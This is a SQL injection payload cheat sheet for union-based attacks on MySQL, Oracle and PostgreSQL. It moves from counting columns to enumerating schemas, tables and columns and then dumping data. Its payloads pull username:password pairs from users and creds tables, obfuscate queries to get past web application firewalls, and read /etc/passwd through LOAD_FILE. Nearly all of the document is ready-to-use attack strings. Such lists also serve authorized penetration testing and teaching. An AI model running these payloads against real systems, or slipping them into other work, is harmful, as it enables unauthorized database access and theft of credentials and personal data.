```sql
//*==============================*
  MySQL - Union-Based SQLi
*==============================*/

/* --- Detecting the Number of Columns --- */
' ORDER BY 1-- -                     -- No error: at least 1 column
' ORDER BY 2-- -                     -- No error: at least 2 columns
' ORDER BY 3-- -                     -- Error: only 2 columns exist

' UNION SELECT NULL-- -             -- Error: more columns expected
' UNION SELECT NULL, NULL-- -       -- No error: 2 columns confirmed
' UNION SELECT 1,2-- -              -- Use numbered values to identify reflected columns

/* --- Determining Column Data Types --- */
' UNION SELECT 'abc', NULL-- -      -- Tests if first column accepts string
' UNION SELECT NULL, 123-- -        -- Tests if second column accepts integer
' UNION SELECT NULL, '2023-01-01'-- - -- Tests if column supports date type

/* --- Extracting Database Information --- */
' UNION SELECT NULL, DATABASE()-- -           -- Get current database name
' UNION SELECT NULL, VERSION()-- -            -- Get MySQL version
' UNION SELECT NULL, USER()-- -               -- Get current DB user
' UNION SELECT NULL, @@hostname-- -           -- Get server hostname
' UNION SELECT NULL, @@datadir-- -            -- Get database data directory

/* --- Listing Databases --- */
' UNION SELECT NULL, GROUP_CONCAT(schema_name) 
FROM information_schema.schemata-- -

/* --- Listing Tables from a Specific Database --- */
' UNION SELECT NULL, GROUP_CONCAT(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'target_db'-- -

/* --- Listing Columns from a Specific Table --- */
' UNION SELECT NULL, GROUP_CONCAT(column_name) 
FROM information_schema.columns 
WHERE table_schema = 'target_db'
AND table_name = 'target_table' -- -

/* --- Dumping data from a column of the listed table --- */
' union select group_concat(column_name, "\n") from target_db.target_table-- -

/* --- Dumping data from specific columns --- */
' UNION SELECT GROUP_CONCAT(column_name1), GROUP_CONCAT(column_name2) 
FROM schea_name.table_name-- -


/* --- Listing Table and Column Pairs --- */
' UNION SELECT NULL, GROUP_CONCAT(table_name, ':', column_name, 0x0a) 
FROM information_schema.columns 
WHERE table_schema = 'target_db'-- -


/* --- Paginating Results --- */
' UNION SELECT NULL, table_name 
FROM information_schema.tables 
LIMIT 1 OFFSET 0-- -

' UNION SELECT NULL, table_name 
FROM information_schema.tables 
LIMIT 1 OFFSET 1-- -

/* --- Filtering by Visible Columns --- */
' UNION SELECT 'visible', NULL-- -   -- If 'visible' appears in output, it's reflected
' UNION SELECT NULL, 'test'-- -      -- Check which columns are output to the page

/* --- Filter Bypasses and Obfuscation --- */
'UnIOn/**/SeLeCT/**/NULL,NULL-- -           -- Case and comment obfuscation
' UNION%09SELECT%09NULL,NULL-- -            -- Using tab characters instead of spaces
' UNION/**/SELECT/**/NULL,NULL-- -          -- Inline comments to bypass WAFs

/* --- Special Functions --- */
' UNION SELECT NULL, @@version_compile_os-- -  -- OS info (Linux/Windows)
' UNION SELECT NULL, LOAD_FILE('/etc/passwd')-- - -- File read (if permissions allow)


/*==============================*
  Oracle - Union-Based SQLi
*==============================*/

/* --- Basic Test --- */
' UNION SELECT 'test' FROM dual-- -         -- Oracle requires SELECT ... FROM clause

/* --- Listing Tables --- */
' UNION SELECT table_name FROM all_tables-- -

/* --- Listing Columns from a Table --- */
' UNION SELECT column_name FROM all_tab_columns 
WHERE table_name = 'USERS'-- -

/* --- Database and User Info --- */
' UNION SELECT banner FROM v$version-- -        -- Oracle version banner
' UNION SELECT username FROM all_users-- -      -- List DB users


/*==============================*
  PostgreSQL - Union-Based SQLi
*==============================*/

/* --- General Info --- */
' UNION SELECT current_database()-- -           -- Current database
' UNION SELECT version()-- -                    -- PostgreSQL version

/* --- Listing Tables --- */
' UNION SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'public'-- -

/* --- Listing Columns --- */
' UNION SELECT column_name FROM information_schema.columns 
WHERE table_name = 'users'-- -

/* --- Enumerating Schemas --- */
' UNION SELECT schema_name FROM information_schema.schemata-- -


/*==============================*
  Cross-Platform & Misc Payloads
*==============================*/

/* --- Error-Based + Boolean Combo --- */
' OR 1=1 UNION SELECT 1,2-- -                 -- Validates injectable condition
' AND 1=0 UNION SELECT 1,2-- -                -- Confirm injection via conditional logic

/* --- Output Formatting --- */
' UNION SELECT NULL, CONCAT(username, ':', password, 0x0a) FROM users-- -
' UNION SELECT NULL, GROUP_CONCAT(CONCAT_WS(':', user, pass)) FROM creds-- -

/* --- Grouping & Aggregation --- */
' UNION SELECT NULL, GROUP_CONCAT(table_name) FROM information_schema.tables-- -
' UNION SELECT NULL, GROUP_CONCAT(column_name SEPARATOR ', ') 
FROM information_schema.columns WHERE table_name='accounts'-- -
```